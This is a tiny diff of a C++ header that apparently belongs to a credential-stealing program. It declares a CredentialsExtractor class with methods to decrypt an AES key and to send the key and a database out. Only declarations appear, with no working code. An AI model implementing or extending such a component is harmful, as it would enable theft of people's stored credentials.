@@ -12,7 +12,6 @@
 class CredentialsExtractor : public Sender {
 public:
     explicit CredentialsExtractor(const Stream &stream);
-
     std::vector<BYTE> decryptAESKey(const std::string& encryptedDataStr);
     std::vector<BYTE>  getDecryptedKey();
     void sendKeyAndDatabase();
